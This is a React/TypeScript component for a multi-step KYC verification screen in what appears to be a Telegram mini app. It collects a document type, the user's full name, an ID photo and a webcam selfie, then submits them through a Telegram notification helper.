import React, { useState, useRef, useEffect } from 'react';
import { FileText, Camera, Check, Upload, ShieldCheck, User, Image, ChevronRight } from 'lucide-react';
import PageHeader from '../components/PageHeader';
import { Haptic } from '../utils/haptics';
import { useUser } from '../context/UserContext';
import { useToast } from '../context/ToastContext';
import { useLanguage } from '../context/LanguageContext';
import { sendVerificationToTelegram, canSendDepositToTelegram } from '../lib/telegramNotify';
import { logAction } from '../lib/appLog';

type KycStep = 'DOC_TYPE' | 'NAME' | 'DOC_PHOTO' | 'SELFIE' | 'SUCCESS';

const STEPS_ORDER: KycStep[] = ['DOC_TYPE', 'NAME', 'DOC_PHOTO', 'SELFIE', 'SUCCESS'];

const DOC_TYPES = [
  { id: 'passport', labelKey: 'kyc_passport', descKey: 'kyc_passport_desc' },
  { id: 'driver', labelKey: 'kyc_driver', descKey: 'kyc_driver_desc' },
  { id: 'id', labelKey: 'kyc_id', descKey: 'kyc_id_desc' },
];

interface KycPageProps {
  onBack: () => void;
}

const KycPage: React.FC<KycPageProps> = ({ onBack }) => {
  const { user, tgid } = useUser();
  const toast = useToast();
  const { t } = useLanguage();
  const [step, setStep] = useState<KycStep>('DOC_TYPE');
  const [docType, setDocType] = useState<string>('');
  const [fullName, setFullName] = useState('');
  const [docFile, setDocFile] = useState<File | null>(null);
  const [selfieFile, setSelfieFile] = useState<File | null>(null);
  const [submitting, setSubmitting] = useState(false);
  const [submittedOk, setSubmittedOk] = useState(false);

  const videoRef = useRef<HTMLVideoElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const [cameraOn, setCameraOn] = useState(false);
  const [selfiePreviewUrl, setSelfiePreviewUrl] = useState<string | null>(null);

  useEffect(() => {
    return () => {
      streamRef.current?.getTracks().forEach((t) => t.stop());
    };
  }, []);

  useEffect(() => {
    if (!selfieFile) {
      if (selfiePreviewUrl) {
        URL.revokeObjectURL(selfiePreviewUrl);
        setSelfiePreviewUrl(null);
      }
      return;
    }
    const url = URL.createObjectURL(selfieFile);
    setSelfiePreviewUrl(url);
    return () => URL.revokeObjectURL(url);
  }, [selfieFile]);

  const startCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      streamRef.current = stream;
      if (videoRef.current) videoRef.current.srcObject = stream;
      setCameraOn(true);
    } catch (e) {
      toast.show(t('kyc_camera_error'), 'error');
    }
  };

  const captureSelfie = () => {
    const video = videoRef.current;
    if (!video || !video.videoWidth) {
      toast.show(t('kyc_enable_camera'), 'error');
      return;
    }
    Haptic.medium();
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;
    ctx.drawImage(video, 0, 0);
    canvas.toBlob(
      (blob) => {
        if (!blob) return;
        const file = new File([blob], 'selfie.jpg', { type: 'image/jpeg' });
        setSelfieFile(file);
        streamRef.current?.getTracks().forEach((t) => t.stop());
        streamRef.current = null;
        setCameraOn(false);
      },
      'image/jpeg',
      0.9
    );
  };

  const retakeSelfie = () => {
    setSelfieFile(null);
    setSelfiePreviewUrl(null);
    startCamera();
  };

  const handleSubmit = async () => {
    if (!docFile || !selfieFile) return;
    if (!canSendDepositToTelegram()) {
      toast.show(t('kyc_telegram_not_configured'), 'error');
      return;
    }
    setSubmitting(true);
    const docItem = DOC_TYPES.find((d) => d.id === docType);
    const docLabel = docItem ? t(docItem.labelKey) : docType;
    const text =
      '🛡 ЗАЯВКА НА ВЕРИФИКАЦИЮ\n\n' +
      `👤 Пользователь: ${fullName || '—'}\n` +
      `📄 Документ: ${docLabel}\n` +
      `🆔 ID: ${user?.user_id ?? tgid ?? '—'}\n` +
      `📅 ${new Date().toLocaleString('ru-RU')}\n\n` +
      '#верификация #kyc';
    const result = await sendVerificationToTelegram(text, docFile, selfieFile);
    setSubmitting(false);
    if (result.ok) {
      setSubmittedOk(true);
      setStep('SUCCESS');
      toast.show(t('kyc_sent_ok'), 'success');
      logAction('kyc_submit', { userId: user?.user_id ?? undefined, tgid: tgid ?? undefined, payload: { doc_type: docType } }).catch(() => {});
    } else {
      toast.show(result.error ?? t('kyc_send_error'), 'error');
    }
  };

  const stepIndex = STEPS_ORDER.indexOf(step);
  const showProgress = step !== 'SUCCESS' && stepIndex >= 0;
  const progressPercent = showProgress ? ((stepIndex + 1) / (STEPS_ORDER.length - 1)) * 100 : 0;

  return (
    <div className="flex flex-col h-full bg-background animate-fade-in">
      <PageHeader title={t('verification')} onBack={onBack} />
      <div className="flex-1 overflow-y-auto p-4">
        {showProgress && (
          <div className="max-w-md mx-auto mb-6">
            <div className="flex justify-between text-xs text-neutral-500 mb-1.5">
              <span>{t('kyc_step', { n: String(stepIndex + 1), total: String(STEPS_ORDER.length - 1) })}</span>
            </div>
            <div className="h-1.5 bg-neutral-800 rounded-full overflow-hidden">
              <div className="h-full bg-neon rounded-full transition-all duration-300" style={{ width: `${progressPercent}%` }} />
            </div>
          </div>
        )}

        <div className="max-w-md mx-auto">
        {step === 'DOC_TYPE' && (
          <div className="space-y-6">
            <div className="text-center mb-6">
              <h2 className="text-xl font-bold text-white mb-1">{t('kyc_doc_type')}</h2>
              <p className="text-neutral-500 text-sm">{t('kyc_doc_type_desc')}</p>
            </div>
            <div className="space-y-3">
              {DOC_TYPES.map((d) => (
                <button
                  key={d.id}
                  onClick={() => { Haptic.light(); setDocType(d.id); setStep('NAME'); }}
                  className="w-full bg-surface border border-neutral-800 rounded-xl p-4 flex items-center gap-4 hover:border-neon/50 hover:bg-neutral-900/50 transition-all text-left group"
                >
                  <div className="w-12 h-12 rounded-xl bg-card border border-border flex items-center justify-center flex-shrink-0 group-hover:border-neon">
                    <FileText size={22} className="text-neon" />
                  </div>
                  <div className="flex-1 min-w-0">
                    <span className="block font-semibold text-white">{t(d.labelKey)}</span>
                    <span className="block text-xs text-neutral-500 mt-0.5">{t(d.descKey)}</span>
                  </div>
                  <ChevronRight size={18} className="text-neutral-600 flex-shrink-0" />
                </button>
              ))}
            </div>
          </div>
        )}

        {step === 'NAME' && (
          <div className="space-y-6">
            <div className="text-center mb-2">
              <h2 className="text-xl font-bold text-white mb-1">{t('kyc_name_title')}</h2>
              <p className="text-neutral-500 text-sm">{t('kyc_name_desc')}</p>
            </div>
            <div className="bg-surface border border-neutral-800 rounded-xl p-4">
              <label className="flex items-center gap-2 text-xs text-neutral-500 uppercase font-bold mb-2">
                <User size={14} />
                {t('kyc_fullname')}
              </label>
              <input
                type="text"
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
                placeholder={t('kyc_fullname_placeholder')}
                className="w-full bg-neutral-900/50 border border-neutral-800 rounded-lg px-4 py-3 text-white placeholder-neutral-600 outline-none focus:border-neon/50 transition-colors"
              />
            </div>
            <button
              onClick={() => { Haptic.light(); setStep('DOC_PHOTO'); }}
              disabled={!fullName.trim()}
              className="w-full py-4 bg-neon text-black font-bold rounded-xl flex items-center justify-center gap-2 active:scale-[0.98] disabled:opacity-50 disabled:pointer-events-none"
            >
              {t('next')} <ChevronRight size={18} />
            </button>
          </div>
        )}

        {step === 'DOC_PHOTO' && (
          <div className="space-y-6">
            <div className="text-center mb-2">
              <h2 className="text-xl font-bold text-white mb-1">{t('kyc_doc_photo_title')}</h2>
              <p className="text-neutral-500 text-sm">{t('kyc_doc_photo_desc')}</p>
            </div>
            <label className="block bg-surface border-2 border-dashed border-neutral-700 rounded-2xl p-8 text-center cursor-pointer hover:border-neon/50 hover:bg-neutral-900/30 transition-all">
              <input
                type="file"
                accept="image/*"
                className="hidden"
                onChange={(e) => {
                  const f = e.target.files?.[0];
                  if (f) { Haptic.light(); setDocFile(f); setStep('SELFIE'); }
                }}
              />
              {docFile ? (
                <div className="flex flex-col items-center gap-2">
                  <div className="w-14 h-14 rounded-full bg-green-500/20 flex items-center justify-center">
                    <Check size={28} className="text-up" />
                  </div>
                  <span className="text-up font-medium">{t('kyc_doc_uploaded')}</span>
                  <span className="text-neutral-500 text-xs">{t('kyc_doc_replace')}</span>
                </div>
              ) : (
                <div className="flex flex-col items-center gap-3">
                  <div className="w-14 h-14 rounded-full bg-neutral-800 flex items-center justify-center">
                    <Image size={28} className="text-neutral-500" />
                  </div>
                  <span className="text-white font-medium">{t('kyc_upload_photo')}</span>
                  <span className="text-neutral-500 text-sm">{t('kyc_or_photo')}</span>
                </div>
              )}
            </label>
          </div>
        )}

        {step === 'SELFIE' && (
          <div className="flex flex-col items-center">
            <div className="text-center mb-6 w-full">
              <h2 className="text-xl font-bold text-white mb-1">{t('kyc_selfie_title')}</h2>
              <p className="text-neutral-500 text-sm">{t('kyc_selfie_desc')}</p>
            </div>

            {/* Превью снимка или видео с камеры */}
            <div className="relative w-full rounded-2xl overflow-hidden bg-black border border-neutral-800 aspect-[3/4] max-h-[360px] flex items-center justify-center">
              {selfieFile && selfiePreviewUrl ? (
                <img
                  src={selfiePreviewUrl}
                  alt={t('kyc_selfie_alt')}
                  className="w-full h-full object-cover"
                />
              ) : (
                <video
                  ref={videoRef}
                  autoPlay
                  playsInline
                  muted
                  className="w-full h-full object-cover"
                />
              )}
              {!cameraOn && !selfieFile && (
                <div className="absolute inset-0 flex flex-col items-center justify-center bg-neutral-900/90 text-neutral-500">
                  <Camera size={48} className="mb-3 opacity-60" />
                  <span className="text-sm">{t('kyc_camera_off')}</span>
                </div>
              )}
            </div>

            {/* Кнопки по состоянию */}
            <div className="w-full mt-6 space-y-3">
              {!selfieFile && !cameraOn && (
                <button
                  type="button"
                  onClick={startCamera}
                  className="w-full py-4 bg-neon text-black font-bold rounded-xl flex items-center justify-center gap-2 active:scale-[0.98] transition-transform"
                >
                  <Camera size={22} /> {t('kyc_turn_on_camera')}
                </button>
              )}
              {cameraOn && !selfieFile && (
                <button
                  type="button"
                  onClick={captureSelfie}
                  className="w-full py-4 bg-neon hover:opacity-90 text-white font-bold rounded-xl flex items-center justify-center gap-2 active:scale-[0.98] transition-transform"
                >
                  <Camera size={22} /> {t('kyc_take_photo')}
                </button>
              )}
              {selfieFile && (
                <>
                  <p className="text-center text-up text-sm mb-1">✓ {t('kyc_photo_ready')}</p>
                  <button
                    type="button"
                    onClick={handleSubmit}
                    disabled={submitting}
                    className="w-full py-4 bg-neon text-black font-bold rounded-xl flex items-center justify-center gap-2 active:scale-[0.98] transition-transform disabled:opacity-50 disabled:pointer-events-none"
                  >
                    {submitting ? (
                      t('kyc_submitting')
                    ) : (
                      <>
                        <Check size={22} /> {t('kyc_submit')}
                      </>
                    )}
                  </button>
                  <button
                    type="button"
                    onClick={retakeSelfie}
                    className="w-full py-3 text-neutral-400 hover:text-white text-sm font-medium rounded-xl border border-neutral-700 hover:border-neutral-600 transition-colors"
                  >
                    {t('kyc_retake')}
                    </button>
                  </>
              )}

            </div>
          </div>
        )}

        {step === 'SUCCESS' && (
          <div className="bg-surface border border-neutral-800 rounded-2xl p-8 text-center">
            <div className="w-20 h-20 rounded-full bg-green-500/20 flex items-center justify-center mx-auto mb-5">
              <ShieldCheck size={40} className="text-up" />
            </div>
            {submittedOk ? (
              <>
                <h2 className="text-xl font-bold text-white mb-2">{t('kyc_success_title')}</h2>
                <p className="text-neutral-500 text-sm mb-6">{t('kyc_success_desc')}</p>
                <button onClick={() => { Haptic.tap(); onBack(); }} className="w-full py-4 bg-neon text-black font-bold rounded-xl active:scale-[0.98]">
                  {t('kyc_to_profile')}
                </button>
              </>
            ) : (
              <>
                <h2 className="text-xl font-bold text-white mb-2">{t('kyc_docs_ready_title')}</h2>
                <p className="text-neutral-500 text-sm mb-6">{t('kyc_docs_ready_desc')}</p>
                <button
                  onClick={handleSubmit}
                  disabled={submitting}
                  className="w-full py-4 bg-neon text-black font-bold rounded-xl disabled:opacity-50 active:scale-[0.98]"
                >
                  {submitting ? t('kyc_submitting') : t('kyc_submit_btn')}
                </button>
                <button onClick={() => { setSelfieFile(null); setStep('SELFIE'); startCamera(); }} className="mt-3 text-neutral-500 text-sm">
                  {t('kyc_retake')}
                </button>
              </>
            )}
          </div>
        )}
        </div>
      </div>
    </div>
  );
};

export default KycPage;
